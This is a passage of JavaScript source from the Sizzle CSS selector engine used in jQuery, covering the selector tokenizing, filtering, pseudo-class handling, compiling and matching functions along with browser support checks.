                  null;
  };

  Sizzle.escape = function( sel ) {
      return (sel + "").replace( rcssescape, fcssescape );
  };

  Sizzle.error = function( msg ) {
      throw new Error( "Syntax error, unrecognized expression: " + msg );
  };

  /**
   * Document sorting and removing duplicates
   * @param {ArrayLike} results
   */
  Sizzle.uniqueSort = function( results ) {
      var elem,
          duplicates = [],
          j = 0,
          i = 0;

      // Unless we *know* we can detect duplicates, assume their presence
      hasDuplicate = !support.detectDuplicates;
      sortInput = !support.sortStable && results.slice( 0 );
      results.sort( sortOrder );

      if ( hasDuplicate ) {
          while ( (elem = results[i++]) ) {
              if ( elem === results[ i ] ) {
                  j = duplicates.push( i );
              }
          }
          while ( j-- ) {
              results.splice( duplicates[ j ], 1 );
          }
      }

      // Clear input after sorting to release objects
      // See https://github.com/jquery/sizzle/pull/225
      sortInput = null;

      return results;
  };

  /**
   * Utility function for retrieving the text value of an array of DOM nodes
   * @param {Array|Element} elem
   */
  getText = Sizzle.getText = function( elem ) {
      var node,
          ret = "",
          i = 0,
          nodeType = elem.nodeType;

      if ( !nodeType ) {
          // If no nodeType, this is expected to be an array
          while ( (node = elem[i++]) ) {
              // Do not traverse comment nodes
              ret += getText( node );
          }
      } else if ( nodeType === 1 || nodeType === 9 || nodeType === 11 ) {
          // Use textContent for elements
          // innerText usage removed for consistency of new lines (jQuery #11153)
          if ( typeof elem.textContent === "string" ) {
              return elem.textContent;
          } else {
              // Traverse its children
              for ( elem = elem.firstChild; elem; elem = elem.nextSibling ) {
                  ret += getText( elem );
              }
          }
      } else if ( nodeType === 3 || nodeType === 4 ) {
          return elem.nodeValue;
      }
      // Do not include comment or processing instruction nodes

      return ret;
  };

  Expr = Sizzle.selectors = {

      // Can be adjusted by the user
      cacheLength: 50,

      createPseudo: markFunction,

      match: matchExpr,

      attrHandle: {},

      find: {},

      relative: {
          ">": { dir: "parentNode", first: true },
          " ": { dir: "parentNode" },
          "+": { dir: "previousSibling", first: true },
          "~": { dir: "previousSibling" }
      },

      preFilter: {
          "ATTR": function( match ) {
              match[1] = match[1].replace( runescape, funescape );

              // Move the given value to match[3] whether quoted or unquoted
              match[3] = ( match[3] || match[4] || match[5] || "" ).replace( runescape, funescape );

              if ( match[2] === "~=" ) {
                  match[3] = " " + match[3] + " ";
              }

              return match.slice( 0, 4 );
          },

          "CHILD": function( match ) {
              /* matches from matchExpr["CHILD"]
                  1 type (only|nth|...)
                  2 what (child|of-type)
                  3 argument (even|odd|\d*|\d*n([+-]\d+)?|...)
                  4 xn-component of xn+y argument ([+-]?\d*n|)
                  5 sign of xn-component
                  6 x of xn-component
                  7 sign of y-component
                  8 y of y-component
              */
              match[1] = match[1].toLowerCase();

              if ( match[1].slice( 0, 3 ) === "nth" ) {
                  // nth-* requires argument
                  if ( !match[3] ) {
                      Sizzle.error( match[0] );
                  }

                  // numeric x and y parameters for Expr.filter.CHILD
                  // remember that false/true cast respectively to 0/1
                  match[4] = +( match[4] ? match[5] + (match[6] || 1) : 2 * ( match[3] === "even" || match[3] === "odd" ) );
                  match[5] = +( ( match[7] + match[8] ) || match[3] === "odd" );

              // other types prohibit arguments
              } else if ( match[3] ) {
                  Sizzle.error( match[0] );
              }

              return match;
          },

          "PSEUDO": function( match ) {
              var excess,
                  unquoted = !match[6] && match[2];

              if ( matchExpr["CHILD"].test( match[0] ) ) {
                  return null;
              }

              // Accept quoted arguments as-is
              if ( match[3] ) {
                  match[2] = match[4] || match[5] || "";

              // Strip excess characters from unquoted arguments
              } else if ( unquoted && rpseudo.test( unquoted ) &&
                  // Get excess from tokenize (recursively)
                  (excess = tokenize( unquoted, true )) &&
                  // advance to the next closing parenthesis
                  (excess = unquoted.indexOf( ")", unquoted.length - excess ) - unquoted.length) ) {

                  // excess is a negative index
                  match[0] = match[0].slice( 0, excess );
                  match[2] = unquoted.slice( 0, excess );
              }

              // Return only captures needed by the pseudo filter method (type and argument)
              return match.slice( 0, 3 );
          }
      },

      filter: {

          "TAG": function( nodeNameSelector ) {
              var nodeName = nodeNameSelector.replace( runescape, funescape ).toLowerCase();
              return nodeNameSelector === "*" ?
                  function() { return true; } :
                  function( elem ) {
                      return elem.nodeName && elem.nodeName.toLowerCase() === nodeName;
                  };
          },

          "CLASS": function( className ) {
              var pattern = classCache[ className + " " ];

              return pattern ||
                  (pattern = new RegExp( "(^|" + whitespace + ")" + className + "(" + whitespace + "|$)" )) &&
                  classCache( className, function( elem ) {
                      return pattern.test( typeof elem.className === "string" && elem.className || typeof elem.getAttribute !== "undefined" && elem.getAttribute("class") || "" );
                  });
          },

          "ATTR": function( name, operator, check ) {
              return function( elem ) {
                  var result = Sizzle.attr( elem, name );

                  if ( result == null ) {
                      return operator === "!=";
                  }
                  if ( !operator ) {
                      return true;
                  }

                  result += "";

                  return operator === "=" ? result === check :
                      operator === "!=" ? result !== check :
                      operator === "^=" ? check && result.indexOf( check ) === 0 :
                      operator === "*=" ? check && result.indexOf( check ) > -1 :
                      operator === "$=" ? check && result.slice( -check.length ) === check :
                      operator === "~=" ? ( " " + result.replace( rwhitespace, " " ) + " " ).indexOf( check ) > -1 :
                      operator === "|=" ? result === check || result.slice( 0, check.length + 1 ) === check + "-" :
                      false;
              };
          },

          "CHILD": function( type, what, argument, first, last ) {
              var simple = type.slice( 0, 3 ) !== "nth",
                  forward = type.slice( -4 ) !== "last",
                  ofType = what === "of-type";

              return first === 1 && last === 0 ?

                  // Shortcut for :nth-*(n)
                  function( elem ) {
                      return !!elem.parentNode;
                  } :

                  function( elem, context, xml ) {
                      var cache, uniqueCache, outerCache, node, nodeIndex, start,
                          dir = simple !== forward ? "nextSibling" : "previousSibling",
                          parent = elem.parentNode,
                          name = ofType && elem.nodeName.toLowerCase(),
                          useCache = !xml && !ofType,
                          diff = false;

                      if ( parent ) {

                          // :(first|last|only)-(child|of-type)
                          if ( simple ) {
                              while ( dir ) {
                                  node = elem;
                                  while ( (node = node[ dir ]) ) {
                                      if ( ofType ?
                                          node.nodeName.toLowerCase() === name :
                                          node.nodeType === 1 ) {

                                          return false;
                                      }
                                  }
                                  // Reverse direction for :only-* (if we haven't yet done so)
                                  start = dir = type === "only" && !start && "nextSibling";
                              }
                              return true;
                          }

                          start = [ forward ? parent.firstChild : parent.lastChild ];

                          // non-xml :nth-child(...) stores cache data on `parent`
                          if ( forward && useCache ) {

                              // Seek `elem` from a previously-cached index

                              // ...in a gzip-friendly way
                              node = parent;
                              outerCache = node[ expando ] || (node[ expando ] = {});

                              // Support: IE <9 only
                              // Defend against cloned attroperties (jQuery gh-1709)
                              uniqueCache = outerCache[ node.uniqueID ] ||
                                  (outerCache[ node.uniqueID ] = {});

                              cache = uniqueCache[ type ] || [];
                              nodeIndex = cache[ 0 ] === dirruns && cache[ 1 ];
                              diff = nodeIndex && cache[ 2 ];
                              node = nodeIndex && parent.childNodes[ nodeIndex ];

                              while ( (node = ++nodeIndex && node && node[ dir ] ||

                                  // Fallback to seeking `elem` from the start
                                  (diff = nodeIndex = 0) || start.pop()) ) {

                                  // When found, cache indexes on `parent` and break
                                  if ( node.nodeType === 1 && ++diff && node === elem ) {
                                      uniqueCache[ type ] = [ dirruns, nodeIndex, diff ];
                                      break;
                                  }
                              }

                          } else {
                              // Use previously-cached element index if available
                              if ( useCache ) {
                                  // ...in a gzip-friendly way
                                  node = elem;
                                  outerCache = node[ expando ] || (node[ expando ] = {});

                                  // Support: IE <9 only
                                  // Defend against cloned attroperties (jQuery gh-1709)
                                  uniqueCache = outerCache[ node.uniqueID ] ||
                                      (outerCache[ node.uniqueID ] = {});

                                  cache = uniqueCache[ type ] || [];
                                  nodeIndex = cache[ 0 ] === dirruns && cache[ 1 ];
                                  diff = nodeIndex;
                              }

                              // xml :nth-child(...)
                              // or :nth-last-child(...) or :nth(-last)?-of-type(...)
                              if ( diff === false ) {
                                  // Use the same loop as above to seek `elem` from the start
                                  while ( (node = ++nodeIndex && node && node[ dir ] ||
                                      (diff = nodeIndex = 0) || start.pop()) ) {

                                      if ( ( ofType ?
                                          node.nodeName.toLowerCase() === name :
                                          node.nodeType === 1 ) &&
                                          ++diff ) {

                                          // Cache the index of each encountered element
                                          if ( useCache ) {
                                              outerCache = node[ expando ] || (node[ expando ] = {});

                                              // Support: IE <9 only
                                              // Defend against cloned attroperties (jQuery gh-1709)
                                              uniqueCache = outerCache[ node.uniqueID ] ||
                                                  (outerCache[ node.uniqueID ] = {});

                                              uniqueCache[ type ] = [ dirruns, diff ];
                                          }

                                          if ( node === elem ) {
                                              break;
                                          }
                                      }
                                  }
                              }
                          }

                          // Incorporate the offset, then check against cycle size
                          diff -= last;
                          return diff === first || ( diff % first === 0 && diff / first >= 0 );
                      }
                  };
          },

          "PSEUDO": function( pseudo, argument ) {
              // pseudo-class names are case-insensitive
              // http://www.w3.org/TR/selectors/#pseudo-classes
              // Prioritize by case sensitivity in case custom pseudos are added with uppercase letters
              // Remember that setFilters inherits from pseudos
              var args,
                  fn = Expr.pseudos[ pseudo ] || Expr.setFilters[ pseudo.toLowerCase() ] ||
                      Sizzle.error( "unsupported pseudo: " + pseudo );

              // The user may use createPseudo to indicate that
              // arguments are needed to create the filter function
              // just as Sizzle does
              if ( fn[ expando ] ) {
                  return fn( argument );
              }

              // But maintain support for old signatures
              if ( fn.length > 1 ) {
                  args = [ pseudo, pseudo, "", argument ];
                  return Expr.setFilters.hasOwnProperty( pseudo.toLowerCase() ) ?
                      markFunction(function( seed, matches ) {
                          var idx,
                              matched = fn( seed, argument ),
                              i = matched.length;
                          while ( i-- ) {
                              idx = indexOf( seed, matched[i] );
                              seed[ idx ] = !( matches[ idx ] = matched[i] );
                          }
                      }) :
                      function( elem ) {
                          return fn( elem, 0, args );
                      };
              }

              return fn;
          }
      },

      pseudos: {
          // Potentially complex pseudos
          "not": markFunction(function( selector ) {
              // Trim the selector passed to compile
              // to avoid treating leading and trailing
              // spaces as combinators
              var input = [],
                  results = [],
                  matcher = compile( selector.replace( rtrim, "$1" ) );

              return matcher[ expando ] ?
                  markFunction(function( seed, matches, context, xml ) {
                      var elem,
                          unmatched = matcher( seed, null, xml, [] ),
                          i = seed.length;

                      // Match elements unmatched by `matcher`
                      while ( i-- ) {
                          if ( (elem = unmatched[i]) ) {
                              seed[i] = !(matches[i] = elem);
                          }
                      }
                  }) :
                  function( elem, context, xml ) {
                      input[0] = elem;
                      matcher( input, null, xml, results );
                      // Don't keep the element (issue #299)
                      input[0] = null;
                      return !results.pop();
                  };
          }),

          "has": markFunction(function( selector ) {
              return function( elem ) {
                  return Sizzle( selector, elem ).length > 0;
              };
          }),

          "contains": markFunction(function( text ) {
              text = text.replace( runescape, funescape );
              return function( elem ) {
                  return ( elem.textContent || elem.innerText || getText( elem ) ).indexOf( text ) > -1;
              };
          }),

          // "Whether an element is represented by a :lang() selector
          // is based solely on the element's language value
          // being equal to the identifier C,
          // or beginning with the identifier C immediately followed by "-".
          // The matching of C against the element's language value is performed case-insensitively.
          // The identifier C does not have to be a valid language name."
          // http://www.w3.org/TR/selectors/#lang-pseudo
          "lang": markFunction( function( lang ) {
              // lang value must be a valid identifier
              if ( !ridentifier.test(lang || "") ) {
                  Sizzle.error( "unsupported lang: " + lang );
              }
              lang = lang.replace( runescape, funescape ).toLowerCase();
              return function( elem ) {
                  var elemLang;
                  do {
                      if ( (elemLang = documentIsHTML ?
                          elem.lang :
                          elem.getAttribute("xml:lang") || elem.getAttribute("lang")) ) {

                          elemLang = elemLang.toLowerCase();
                          return elemLang === lang || elemLang.indexOf( lang + "-" ) === 0;
                      }
                  } while ( (elem = elem.parentNode) && elem.nodeType === 1 );
                  return false;
              };
          }),

          // Miscellaneous
          "target": function( elem ) {
              var hash = window.location && window.location.hash;
              return hash && hash.slice( 1 ) === elem.id;
          },

          "root": function( elem ) {
              return elem === docElem;
          },

          "focus": function( elem ) {
              return elem === document.activeElement && (!document.hasFocus || document.hasFocus()) && !!(elem.type || elem.href || ~elem.tabIndex);
          },

          // Boolean properties
          "enabled": createDisabledPseudo( false ),
          "disabled": createDisabledPseudo( true ),

          "checked": function( elem ) {
              // In CSS3, :checked should return both checked and selected elements
              // http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked
              var nodeName = elem.nodeName.toLowerCase();
              return (nodeName === "input" && !!elem.checked) || (nodeName === "option" && !!elem.selected);
          },

          "selected": function( elem ) {
              // Accessing this property makes selected-by-default
              // options in Safari work properly
              if ( elem.parentNode ) {
                  elem.parentNode.selectedIndex;
              }

              return elem.selected === true;
          },

          // Contents
          "empty": function( elem ) {
              // http://www.w3.org/TR/selectors/#empty-pseudo
              // :empty is negated by element (1) or content nodes (text: 3; cdata: 4; entity ref: 5),
              //   but not by others (comment: 8; processing instruction: 7; etc.)
              // nodeType < 6 works because attributes (2) do not appear as children
              for ( elem = elem.firstChild; elem; elem = elem.nextSibling ) {
                  if ( elem.nodeType < 6 ) {
                      return false;
                  }
              }
              return true;
          },

          "parent": function( elem ) {
              return !Expr.pseudos["empty"]( elem );
          },

          // Element/input types
          "header": function( elem ) {
              return rheader.test( elem.nodeName );
          },

          "input": function( elem ) {
              return rinputs.test( elem.nodeName );
          },

          "button": function( elem ) {
              var name = elem.nodeName.toLowerCase();
              return name === "input" && elem.type === "button" || name === "button";
          },

          "text": function( elem ) {
              var attr;
              return elem.nodeName.toLowerCase() === "input" &&
                  elem.type === "text" &&

                  // Support: IE<8
                  // New HTML5 attribute values (e.g., "search") appear with elem.type === "text"
                  ( (attr = elem.getAttribute("type")) == null || attr.toLowerCase() === "text" );
          },

          // Position-in-collection
          "first": createPositionalPseudo(function() {
              return [ 0 ];
          }),

          "last": createPositionalPseudo(function( matchIndexes, length ) {
              return [ length - 1 ];
          }),

          "eq": createPositionalPseudo(function( matchIndexes, length, argument ) {
              return [ argument < 0 ? argument + length : argument ];
          }),

          "even": createPositionalPseudo(function( matchIndexes, length ) {
              var i = 0;
              for ( ; i < length; i += 2 ) {
                  matchIndexes.push( i );
              }
              return matchIndexes;
          }),

          "odd": createPositionalPseudo(function( matchIndexes, length ) {
              var i = 1;
              for ( ; i < length; i += 2 ) {
                  matchIndexes.push( i );
              }
              return matchIndexes;
          }),

          "lt": createPositionalPseudo(function( matchIndexes, length, argument ) {
              var i = argument < 0 ? argument + length : argument;
              for ( ; --i >= 0; ) {
                  matchIndexes.push( i );
              }
              return matchIndexes;
          }),

          "gt": createPositionalPseudo(function( matchIndexes, length, argument ) {
              var i = argument < 0 ? argument + length : argument;
              for ( ; ++i < length; ) {
                  matchIndexes.push( i );
              }
              return matchIndexes;
          })
      }
  };

  Expr.pseudos["nth"] = Expr.pseudos["eq"];

  // Add button/input type pseudos
  for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
      Expr.pseudos[ i ] = createInputPseudo( i );
  }
  for ( i in { submit: true, reset: true } ) {
      Expr.pseudos[ i ] = createButtonPseudo( i );
  }

  // Easy API for creating new setFilters
  function setFilters() {}
  setFilters.prototype = Expr.filters = Expr.pseudos;
  Expr.setFilters = new setFilters();

  tokenize = Sizzle.tokenize = function( selector, parseOnly ) {
      var matched, match, tokens, type,
          soFar, groups, preFilters,
          cached = tokenCache[ selector + " " ];

      if ( cached ) {
          return parseOnly ? 0 : cached.slice( 0 );
      }

      soFar = selector;
      groups = [];
      preFilters = Expr.preFilter;

      while ( soFar ) {

          // Comma and first run
          if ( !matched || (match = rcomma.exec( soFar )) ) {
              if ( match ) {
                  // Don't consume trailing commas as valid
                  soFar = soFar.slice( match[0].length ) || soFar;
              }
              groups.push( (tokens = []) );
          }

          matched = false;

          // Combinators
          if ( (match = rcombinators.exec( soFar )) ) {
              matched = match.shift();
              tokens.push({
                  value: matched,
                  // Cast descendant combinators to space
                  type: match[0].replace( rtrim, " " )
              });
              soFar = soFar.slice( matched.length );
          }

          // Filters
          for ( type in Expr.filter ) {
              if ( (match = matchExpr[ type ].exec( soFar )) && (!preFilters[ type ] ||
                  (match = preFilters[ type ]( match ))) ) {
                  matched = match.shift();
                  tokens.push({
                      value: matched,
                      type: type,
                      matches: match
                  });
                  soFar = soFar.slice( matched.length );
              }
          }

          if ( !matched ) {
              break;
          }
      }

      // Return the length of the invalid excess
      // if we're just parsing
      // Otherwise, throw an error or return tokens
      return parseOnly ?
          soFar.length :
          soFar ?
              Sizzle.error( selector ) :
              // Cache the tokens
              tokenCache( selector, groups ).slice( 0 );
  };

  function toSelector( tokens ) {
      var i = 0,
          len = tokens.length,
          selector = "";
      for ( ; i < len; i++ ) {
          selector += tokens[i].value;
      }
      return selector;
  }

  function addCombinator( matcher, combinator, base ) {
      var dir = combinator.dir,
          skip = combinator.next,
          key = skip || dir,
          checkNonElements = base && key === "parentNode",
          doneName = done++;

      return combinator.first ?
          // Check against closest ancestor/preceding element
          function( elem, context, xml ) {
              while ( (elem = elem[ dir ]) ) {
                  if ( elem.nodeType === 1 || checkNonElements ) {
                      return matcher( elem, context, xml );
                  }
              }
              return false;
          } :

          // Check against all ancestor/preceding elements
          function( elem, context, xml ) {
              var oldCache, uniqueCache, outerCache,
                  newCache = [ dirruns, doneName ];

              // We can't set arbitrary data on XML nodes, so they don't benefit from combinator caching
              if ( xml ) {
                  while ( (elem = elem[ dir ]) ) {
                      if ( elem.nodeType === 1 || checkNonElements ) {
                          if ( matcher( elem, context, xml ) ) {
                              return true;
                          }
                      }
                  }
              } else {
                  while ( (elem = elem[ dir ]) ) {
                      if ( elem.nodeType === 1 || checkNonElements ) {
                          outerCache = elem[ expando ] || (elem[ expando ] = {});

                          // Support: IE <9 only
                          // Defend against cloned attroperties (jQuery gh-1709)
                          uniqueCache = outerCache[ elem.uniqueID ] || (outerCache[ elem.uniqueID ] = {});

                          if ( skip && skip === elem.nodeName.toLowerCase() ) {
                              elem = elem[ dir ] || elem;
                          } else if ( (oldCache = uniqueCache[ key ]) &&
                              oldCache[ 0 ] === dirruns && oldCache[ 1 ] === doneName ) {

                              // Assign to newCache so results back-propagate to previous elements
                              return (newCache[ 2 ] = oldCache[ 2 ]);
                          } else {
                              // Reuse newcache so results back-propagate to previous elements
                              uniqueCache[ key ] = newCache;

                              // A match means we're done; a fail means we have to keep checking
                              if ( (newCache[ 2 ] = matcher( elem, context, xml )) ) {
                                  return true;
                              }
                          }
                      }
                  }
              }
              return false;
          };
  }

  function elementMatcher( matchers ) {
      return matchers.length > 1 ?
          function( elem, context, xml ) {
              var i = matchers.length;
              while ( i-- ) {
                  if ( !matchers[i]( elem, context, xml ) ) {
                      return false;
                  }
              }
              return true;
          } :
          matchers[0];
  }

  function multipleContexts( selector, contexts, results ) {
      var i = 0,
          len = contexts.length;
      for ( ; i < len; i++ ) {
          Sizzle( selector, contexts[i], results );
      }
      return results;
  }

  function condense( unmatched, map, filter, context, xml ) {
      var elem,
          newUnmatched = [],
          i = 0,
          len = unmatched.length,
          mapped = map != null;

      for ( ; i < len; i++ ) {
          if ( (elem = unmatched[i]) ) {
              if ( !filter || filter( elem, context, xml ) ) {
                  newUnmatched.push( elem );
                  if ( mapped ) {
                      map.push( i );
                  }
              }
          }
      }

      return newUnmatched;
  }

  function setMatcher( preFilter, selector, matcher, postFilter, postFinder, postSelector ) {
      if ( postFilter && !postFilter[ expando ] ) {
          postFilter = setMatcher( postFilter );
      }
      if ( postFinder && !postFinder[ expando ] ) {
          postFinder = setMatcher( postFinder, postSelector );
      }
      return markFunction(function( seed, results, context, xml ) {
          var temp, i, elem,
              preMap = [],
              postMap = [],
              preexisting = results.length,

              // Get initial elements from seed or context
              elems = seed || multipleContexts( selector || "*", context.nodeType ? [ context ] : context, [] ),

              // Prefilter to get matcher input, preserving a map for seed-results synchronization
              matcherIn = preFilter && ( seed || !selector ) ?
                  condense( elems, preMap, preFilter, context, xml ) :
                  elems,

              matcherOut = matcher ?
                  // If we have a postFinder, or filtered seed, or non-seed postFilter or preexisting results,
                  postFinder || ( seed ? preFilter : preexisting || postFilter ) ?

                      // ...intermediate processing is necessary
                      [] :

                      // ...otherwise use results directly
                      results :
                  matcherIn;

          // Find primary matches
          if ( matcher ) {
              matcher( matcherIn, matcherOut, context, xml );
          }

          // Apply postFilter
          if ( postFilter ) {
              temp = condense( matcherOut, postMap );
              postFilter( temp, [], context, xml );

              // Un-match failing elements by moving them back to matcherIn
              i = temp.length;
              while ( i-- ) {
                  if ( (elem = temp[i]) ) {
                      matcherOut[ postMap[i] ] = !(matcherIn[ postMap[i] ] = elem);
                  }
              }
          }

          if ( seed ) {
              if ( postFinder || preFilter ) {
                  if ( postFinder ) {
                      // Get the final matcherOut by condensing this intermediate into postFinder contexts
                      temp = [];
                      i = matcherOut.length;
                      while ( i-- ) {
                          if ( (elem = matcherOut[i]) ) {
                              // Restore matcherIn since elem is not yet a final match
                              temp.push( (matcherIn[i] = elem) );
                          }
                      }
                      postFinder( null, (matcherOut = []), temp, xml );
                  }

                  // Move matched elements from seed to results to keep them synchronized
                  i = matcherOut.length;
                  while ( i-- ) {
                      if ( (elem = matcherOut[i]) &&
                          (temp = postFinder ? indexOf( seed, elem ) : preMap[i]) > -1 ) {

                          seed[temp] = !(results[temp] = elem);
                      }
                  }
              }

          // Add elements to results, through postFinder if defined
          } else {
              matcherOut = condense(
                  matcherOut === results ?
                      matcherOut.splice( preexisting, matcherOut.length ) :
                      matcherOut
              );
              if ( postFinder ) {
                  postFinder( null, results, matcherOut, xml );
              } else {
                  push.apply( results, matcherOut );
              }
          }
      });
  }

  function matcherFromTokens( tokens ) {
      var checkContext, matcher, j,
          len = tokens.length,
          leadingRelative = Expr.relative[ tokens[0].type ],
          implicitRelative = leadingRelative || Expr.relative[" "],
          i = leadingRelative ? 1 : 0,

          // The foundational matcher ensures that elements are reachable from top-level context(s)
          matchContext = addCombinator( function( elem ) {
              return elem === checkContext;
          }, implicitRelative, true ),
          matchAnyContext = addCombinator( function( elem ) {
              return indexOf( checkContext, elem ) > -1;
          }, implicitRelative, true ),
          matchers = [ function( elem, context, xml ) {
              var ret = ( !leadingRelative && ( xml || context !== outermostContext ) ) || (
                  (checkContext = context).nodeType ?
                      matchContext( elem, context, xml ) :
                      matchAnyContext( elem, context, xml ) );
              // Avoid hanging onto element (issue #299)
              checkContext = null;
              return ret;
          } ];

      for ( ; i < len; i++ ) {
          if ( (matcher = Expr.relative[ tokens[i].type ]) ) {
              matchers = [ addCombinator(elementMatcher( matchers ), matcher) ];
          } else {
              matcher = Expr.filter[ tokens[i].type ].apply( null, tokens[i].matches );

              // Return special upon seeing a positional matcher
              if ( matcher[ expando ] ) {
                  // Find the next relative operator (if any) for proper handling
                  j = ++i;
                  for ( ; j < len; j++ ) {
                      if ( Expr.relative[ tokens[j].type ] ) {
                          break;
                      }
                  }
                  return setMatcher(
                      i > 1 && elementMatcher( matchers ),
                      i > 1 && toSelector(
                          // If the preceding token was a descendant combinator, insert an implicit any-element `*`
                          tokens.slice( 0, i - 1 ).concat({ value: tokens[ i - 2 ].type === " " ? "*" : "" })
                      ).replace( rtrim, "$1" ),
                      matcher,
                      i < j && matcherFromTokens( tokens.slice( i, j ) ),
                      j < len && matcherFromTokens( (tokens = tokens.slice( j )) ),
                      j < len && toSelector( tokens )
                  );
              }
              matchers.push( matcher );
          }
      }

      return elementMatcher( matchers );
  }

  function matcherFromGroupMatchers( elementMatchers, setMatchers ) {
      var bySet = setMatchers.length > 0,
          byElement = elementMatchers.length > 0,
          superMatcher = function( seed, context, xml, results, outermost ) {
              var elem, j, matcher,
                  matchedCount = 0,
                  i = "0",
                  unmatched = seed && [],
                  setMatched = [],
                  contextBackup = outermostContext,
                  // We must always have either seed elements or outermost context
                  elems = seed || byElement && Expr.find["TAG"]( "*", outermost ),
                  // Use integer dirruns iff this is the outermost matcher
                  dirrunsUnique = (dirruns += contextBackup == null ? 1 : Math.random() || 0.1),
                  len = elems.length;

              if ( outermost ) {
                  outermostContext = context === document || context || outermost;
              }

              // Add elements passing elementMatchers directly to results
              // Support: IE<9, Safari
              // Tolerate NodeList properties (IE: "length"; Safari: <number>) matching elements by id
              for ( ; i !== len && (elem = elems[i]) != null; i++ ) {
                  if ( byElement && elem ) {
                      j = 0;
                      if ( !context && elem.ownerDocument !== document ) {
                          setDocument( elem );
                          xml = !documentIsHTML;
                      }
                      while ( (matcher = elementMatchers[j++]) ) {
                          if ( matcher( elem, context || document, xml) ) {
                              results.push( elem );
                              break;
                          }
                      }
                      if ( outermost ) {
                          dirruns = dirrunsUnique;
                      }
                  }

                  // Track unmatched elements for set filters
                  if ( bySet ) {
                      // They will have gone through all possible matchers
                      if ( (elem = !matcher && elem) ) {
                          matchedCount--;
                      }

                      // Lengthen the array for every element, matched or not
                      if ( seed ) {
                          unmatched.push( elem );
                      }
                  }
              }

              // `i` is now the count of elements visited above, and adding it to `matchedCount`
              // makes the latter nonnegative.
              matchedCount += i;

              // Apply set filters to unmatched elements
              // NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount`
              // equals `i`), unless we didn't visit _any_ elements in the above loop because we have
              // no element matchers and no seed.
              // Incrementing an initially-string "0" `i` allows `i` to remain a string only in that
              // case, which will result in a "00" `matchedCount` that differs from `i` but is also
              // numerically zero.
              if ( bySet && i !== matchedCount ) {
                  j = 0;
                  while ( (matcher = setMatchers[j++]) ) {
                      matcher( unmatched, setMatched, context, xml );
                  }

                  if ( seed ) {
                      // Reintegrate element matches to eliminate the need for sorting
                      if ( matchedCount > 0 ) {
                          while ( i-- ) {
                              if ( !(unmatched[i] || setMatched[i]) ) {
                                  setMatched[i] = pop.call( results );
                              }
                          }
                      }

                      // Discard index placeholder values to get only actual matches
                      setMatched = condense( setMatched );
                  }

                  // Add matches to results
                  push.apply( results, setMatched );

                  // Seedless set matches succeeding multiple successful matchers stipulate sorting
                  if ( outermost && !seed && setMatched.length > 0 &&
                      ( matchedCount + setMatchers.length ) > 1 ) {

                      Sizzle.uniqueSort( results );
                  }
              }

              // Override manipulation of globals by nested matchers
              if ( outermost ) {
                  dirruns = dirrunsUnique;
                  outermostContext = contextBackup;
              }

              return unmatched;
          };

      return bySet ?
          markFunction( superMatcher ) :
          superMatcher;
  }

  compile = Sizzle.compile = function( selector, match /* Internal Use Only */ ) {
      var i,
          setMatchers = [],
          elementMatchers = [],
          cached = compilerCache[ selector + " " ];

      if ( !cached ) {
          // Generate a function of recursive functions that can be used to check each element
          if ( !match ) {
              match = tokenize( selector );
          }
          i = match.length;
          while ( i-- ) {
              cached = matcherFromTokens( match[i] );
              if ( cached[ expando ] ) {
                  setMatchers.push( cached );
              } else {
                  elementMatchers.push( cached );
              }
          }

          // Cache the compiled function
          cached = compilerCache( selector, matcherFromGroupMatchers( elementMatchers, setMatchers ) );

          // Save selector and tokenization
          cached.selector = selector;
      }
      return cached;
  };

  /**
   * A low-level selection function that works with Sizzle's compiled
   *  selector functions
   * @param {String|Function} selector A selector or a pre-compiled
   *  selector function built with Sizzle.compile
   * @param {Element} context
   * @param {Array} [results]
   * @param {Array} [seed] A set of elements to match against
   */
  select = Sizzle.select = function( selector, context, results, seed ) {
      var i, tokens, token, type, find,
          compiled = typeof selector === "function" && selector,
          match = !seed && tokenize( (selector = compiled.selector || selector) );

      results = results || [];

      // Try to minimize operations if there is only one selector in the list and no seed
      // (the latter of which guarantees us context)
      if ( match.length === 1 ) {

          // Reduce context if the leading compound selector is an ID
          tokens = match[0] = match[0].slice( 0 );
          if ( tokens.length > 2 && (token = tokens[0]).type === "ID" &&
                  context.nodeType === 9 && documentIsHTML && Expr.relative[ tokens[1].type ] ) {

              context = ( Expr.find["ID"]( token.matches[0].replace(runescape, funescape), context ) || [] )[0];
              if ( !context ) {
                  return results;

              // Precompiled matchers will still verify ancestry, so step up a level
              } else if ( compiled ) {
                  context = context.parentNode;
              }

              selector = selector.slice( tokens.shift().value.length );
          }

          // Fetch a seed set for right-to-left matching
          i = matchExpr["needsContext"].test( selector ) ? 0 : tokens.length;
          while ( i-- ) {
              token = tokens[i];

              // Abort if we hit a combinator
              if ( Expr.relative[ (type = token.type) ] ) {
                  break;
              }
              if ( (find = Expr.find[ type ]) ) {
                  // Search, expanding context for leading sibling combinators
                  if ( (seed = find(
                      token.matches[0].replace( runescape, funescape ),
                      rsibling.test( tokens[0].type ) && testContext( context.parentNode ) || context
                  )) ) {

                      // If seed is empty or no tokens remain, we can return early
                      tokens.splice( i, 1 );
                      selector = seed.length && toSelector( tokens );
                      if ( !selector ) {
                          push.apply( results, seed );
                          return results;
                      }

                      break;
                  }
              }
          }
      }

      // Compile and execute a filtering function if one is not provided
      // Provide `match` to avoid retokenization if we modified the selector above
      ( compiled || compile( selector, match ) )(
          seed,
          context,
          !documentIsHTML,
          results,
          !context || rsibling.test( selector ) && testContext( context.parentNode ) || context
      );
      return results;
  };

  // One-time assignments

  // Sort stability
  support.sortStable = expando.split("").sort( sortOrder ).join("") === expando;

  // Support: Chrome 14-35+
  // Always assume duplicates if they aren't passed to the comparison function
  support.detectDuplicates = !!hasDuplicate;

  // Initialize against the default document
  setDocument();

  // Support: Webkit<537.32 - Safari 6.0.3/Chrome 25 (fixed in Chrome 27)
  // Detached nodes confoundingly follow *each other*
  support.sortDetached = assert(function( el ) {
      // Should return 1, but returns 4 (following)
      return el.compareDocumentPosition( document.createElement("fieldset") ) & 1;
  });

  // Support: IE<8
  // Prevent attribute/property "interpolation"
  // https://msdn.microsoft.com/en-us/library/ms536429%28VS.85%29.aspx
  if ( !assert(function( el ) {
      el.innerHTML = "<a href='#'></a>";
      return el.firstChild.getAttribute("href") === "#" ;
  }) ) {
      addHandle( "type|href|height|width", function( elem, name, isXML ) {
          if ( !isXML ) {
              return elem.getAttribute( name, name.toLowerCase() === "type" ? 1 : 2 );
          }
      });
  }

  // Support: IE<9
